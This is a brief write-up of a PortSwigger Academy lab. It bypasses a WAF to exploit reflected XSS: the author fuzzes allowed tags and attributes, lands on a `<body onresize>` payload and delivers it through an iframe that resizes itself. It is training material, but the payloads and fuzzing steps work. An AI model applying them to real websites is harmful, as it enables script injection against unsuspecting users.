> platform -> PortSwigger
> ### Target -> Lab: Reflected XSS into HTML context with most tags and attributes blocked
```bash
This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

```

---
***where is Vulnerability:***
**Goal**

---

### Step:
- 1. open a lab.
- 2. fill simple vanilla xss pay load ->  `<script>alert(1)</script>` **block** ![alt text](image.png)
- 3. try bruteforce in intruder which tag are allowed
- 4. ![alt text](image-1.png)
  - ## body tag allow
- 5. now i try this payload using bodytag in xss cheat provided by portswigger ![alt text](image-2.png)
```javascript
<body onhashchange="print()">

```
- 6. there is attribute error ![alt text](image-3.png)
- 7. fuzz this ![alt text](image-4.png)
  - ![alt text](image-5.png)
  - ![alt text](image-6.png)
- 8. have many optins
- 9. try this
```javascript
<body onresize="print()">
```
- 10. go exploit server
- 11. ![alt text](image-7.png) with our exploit
  - `<iframe src="https://0abd00e00408e901803fa8bf0052000c.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width='100px'>`
- 12. deliver our exploit ![alt text](image-8.png)
- 13. lab solve
